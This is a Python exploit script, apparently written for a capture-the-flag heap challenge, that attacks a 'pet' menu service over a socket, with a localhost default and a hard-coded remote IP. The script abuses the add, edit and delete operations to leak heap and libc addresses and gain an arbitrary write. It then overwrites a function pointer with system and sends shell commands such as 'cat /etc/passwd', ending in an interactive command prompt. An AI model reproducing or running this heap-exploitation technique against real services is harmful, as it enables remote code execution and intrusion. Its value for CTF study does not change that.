#!/usr/bin/python3

import socket
import telnetlib
from struct import pack,unpack
import sys


host = 'localhost'
port = 5555

try:
    if sys.argv[1]:
        host = '178.62.40.102'
        port = 6000
except:
    pass

ENTER_DATA = b'> '

def add_pet(tn, name, kind, old):
    tn.write(b'1')
    tn.read_until(ENTER_DATA)

    tname = type(name)
    kname = type(kind)
    if tname == bytes:
        name += bytes(b'\n')
    else:
        name += '\n'
        name = name.encode('ascii')

    if kname == bytes:
        kind += bytes(b'\n')
    else:
        kind += '\n'
        kind = kind.encode('ascii')

    old  += '\n'

    tn.write(name)
    tn.read_until(ENTER_DATA)


    tn.write(kind)
    tn.read_until(ENTER_DATA)

    tn.write(old.encode('ascii'))
    tn.read_until(ENTER_DATA)


def edit_pet(tn, i, name, kind, old, q):
    tn.write(b'2')
    tn.read_until(ENTER_DATA)

    tname = type(name)
    if tname == bytes:
        name += bytes(b'\n')
    else:
        name += '\n'
        name = name.encode('ascii')

    i    += '\n'
    kind += '\n'
    old  += '\n'
    q    += '\n'

    tn.write(i.encode('ascii'))
    tn.read_until(ENTER_DATA)

    tn.write(name)
    tn.read_until(ENTER_DATA)

    tn.write(kind.encode('ascii'))
    tn.read_until(ENTER_DATA)

    tn.write(old.encode('ascii'))
    tn.read_until(ENTER_DATA)

    tn.write(q.encode('ascii'))
    tn.read_until(ENTER_DATA)


def del_pet(tn, i):
    tn.write(b'5')
    tn.read_until(ENTER_DATA)

    i += '\n'

    tn.write(i.encode('ascii'))
    tn.read_until(ENTER_DATA)

def del_pet_mod(tn, i):
    tn.write(b'5')
    tn.read_until(ENTER_DATA)

    i += '\n'

    tn.write(i.encode('ascii'))


def print_pet(tn, i):
    sockfd = tn.sock

    tn.write(b'3')
    tn.read_until(ENTER_DATA)
    print(i)

    i += '\n'
    tn.write(i.encode('ascii'))
    # tn.read_until(ENTER_DATA)

    tn.read_until(b'name: ')
    name = tn.read_until(b'\nkind: ')[:-7]
    kind = tn.read_until(b'\nold: ')[:-6]
    old = tn.read_until(b'\n---')[:-4]

    # print(name)
    # print(kind)
    # print(old)


    leak_addr = None
    while len(kind) != 8:
        kind += bytes(b'\x00')
    # if len(kind) == 3:
        # kind += bytes(b'\x00')
    if len(kind) != 0:
        leak_addr = unpack("<Q", kind)[0]
    # print("Leak ADDR: 0x%016x" % ( leak_addr ))

    return leak_addr

def main():
    sockfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sockfd.connect((host,port))

    tn = telnetlib.Telnet()
    tn.sock = sockfd
    tn.read_until(ENTER_DATA)

    # input('catch debugger')

    # add_pet(tn, 'hello', 'world', 100)

    leak_addr = None
    add_pet(tn, 'n0', 'k0', '0')
    add_pet(tn, 'n1', 'k1', '1')
    add_pet(tn, 'n2', 'k2', '2')
    add_pet(tn, 'n3', 'k3', '3')
    add_pet(tn, 'n4', 'k4', '4')

    # add_pet(tn, 'n5', 'k5', '5')
    # add_pet(tn, 'n6', 'k6', '6')
    # add_pet(tn, 'n7', 'k7', '7')
    # add_pet(tn, 'n8', 'k8', '8')
    # add_pet(tn, 'n9', 'k9', '9')

    del_pet(tn, '1')
    del_pet(tn, '2')
    del_pet(tn, '3')

    edit_pet(tn, '0', 'F'*16, 'H'*16, '10', 'n')
    edit_pet(tn, '0', '', '', '20', 'y')

    edit_pet(tn, '0', 'F'*16, 'H'*16, '10', 'n')

    add_pet(tn, 'AAAA', 'a1a2a3a4', '44')
    add_pet(tn, 'BBBB', 'bbbb', '55')
    add_pet(tn, 'C'*16, 'b'*16, '55')



    # add_pet(tn, 'CCCC', 'cccc', '66')

    leak_addr = print_pet(tn, '0')
    if leak_addr == None:
        print("BAAAAD")
    else:
        print("Leak ADDR: 0x%016x" % ( leak_addr ))

    # print_pet(tn, '6')
    # print_pet(tn, '7')

    # print_pet(tn, '1')

    # input('catch debugger')


    del_pet(tn, '1')
    # 602080
    # add_pet(tn, pack("<I",0x602080), 'VVVV', '44')
    add_pet(tn, pack("<I",leak_addr+0x200+8), 'VVVV', '44')

    add_pet(tn, 'n5', 'k5', '5')
    add_pet(tn, 'n6', 'k6', '6')
    add_pet(tn, 'n7', 'k7', '7')
    add_pet(tn, 'n8', 'k8', '8')
    add_pet(tn, 'n9', 'k9', '9')

    # input('check temp_pet')

    # WRITE TO ADDRESS `leak_addr+0x200+8` VALUE `0x602020`
    edit_pet(tn, '1', pack("<I", 0x602020), '', '10', 'y')

    leak_addr2 = None

    # READ VALUE FROM ADDRESS `0x602020`
    leak_addr2 = print_pet(tn, '8')
    if leak_addr2 == None:
        print("BAAAAD")
    else:
        print("Leak ADDR: 0x%016x" % ( leak_addr2 ))

    del_pet(tn, '4')
    del_pet(tn, '5')
    del_pet(tn, '6')
    del_pet(tn, '3')
    del_pet(tn, '7')
    del_pet(tn, '9')

    edit_pet(tn, '0', 'X', 'Z', '10', 'n')

    add_pet(tn, 'AAAA', pack("<I", 0x602018), '44')
    add_pet(tn, '', 'ls -la', '55')
    add_pet(tn, 'cat /etc/passwd', 'cat /etc/passwd', '55')
    add_pet(tn, 'n5', 'k5', '5')
    add_pet(tn, 'ls -la', 'ls -la', '6')
    add_pet(tn, 'pwd', 'pwd', '7')

    system_addr = leak_addr2 - 0x2bf00 #- 0x2e210

    edit_pet(tn, '4', pack("<Q", system_addr), '', '10', 'y')

    del_pet(tn, '9')

    data = tn.read_until(ENTER_DATA)
    print(data)
    cmd = input("cmd> ")

    # del_pet(tn, '7')

    while (cmd):
        add_pet(tn, cmd, cmd, '7')

        del_pet_mod(tn, '9')

        data = str(tn.read_until(ENTER_DATA))
        splt = data.split('\\n')
        for data in splt:
            print(data)
        cmd = input("cmd> ")


    input("INTERACT")


    # edit_pet(tn, '0', 'F'*16, 'H'*16, '10', 'n')

    # add_pet(tn, 'AAAA', 'a1a2a3a4', '44')
    # add_pet(tn, 'BBBB', 'bbbb', '55')
    # add_pet(tn, '', '', '55')

    # add_pet(tn, pack("<I",0x602020), 'VVVV', '44')

    # edit_pet(tn, '0', 'F'*16, 'H'*16, '10', 'n')
    # edit_pet(tn, '5', pack("<Q", leak_addr2), '', '10', 'y')



    # add_pet(tn, 'eeee\n', 'ffff\n', '2')
    # add_pet(tn, 'hhhh\n', 'llll\n', '3')



    # add_pet(tn, '\n', '\n', '0')
    # add_pet(tn, 'a', '', 200)
    # add_pet(tn, 'a', '', 200)




    # tn.write(b'1')
    # sockfd.send(b'1')

    # tn.read_until(ENTER_DATA)
    tn.interact()

if __name__ == '__main__':
    main()

